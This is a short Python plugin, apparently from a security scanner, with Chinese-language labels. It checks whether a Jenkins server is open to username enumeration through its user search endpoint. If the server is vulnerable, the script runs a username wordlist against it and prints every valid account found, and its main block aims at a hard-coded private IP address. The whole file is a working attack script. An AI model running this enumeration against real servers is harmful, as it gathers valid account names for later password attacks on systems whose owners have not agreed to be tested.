#!/usr/bin/env python3

'''
name: Jenkins用户名枚举漏洞
description: Jenkins用户名枚举漏洞
'''

import re
from app.lib.utils.common import get_capta
from app.lib.utils.request import request

class Jenkins_Usernumeration_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers = {
            "User-Agent":"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"
        }
        self.capta = get_capta()

    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        result = ""
        url = self.url + "/securityRealm/user/admin/search/index?q="
        try:
            check_req = request.get(url + self.capta, headers = self.headers)
            if "Search for '%s'" % (self.capta) in check_req.text:
                print('存在Jenkins用户枚举漏洞')
                for user in open('app/username.txt', 'r', encoding = 'utf-8').readlines():
                    user = user.strip()
                    try:
                        result_req = request.get(url + user, headers = self.headers)
                        if 'Jenkins User ID' in result_req.text:
                            print(user)
                    except Exception as e:
                        print(e)
                        pass
                return True
            else:
                print('不存在Jenkins用户枚举漏洞')
                return False
        except Exception as e:
            print(e)
            print('不存在Jenkins用户枚举漏洞')
            return False
        finally:
            pass

if __name__ == '__main__':
    Jenkins_Usernumeration = Jenkins_Usernumeration_BaseVerify('http://10.4.69.55:8789')
    Jenkins_Usernumeration.run()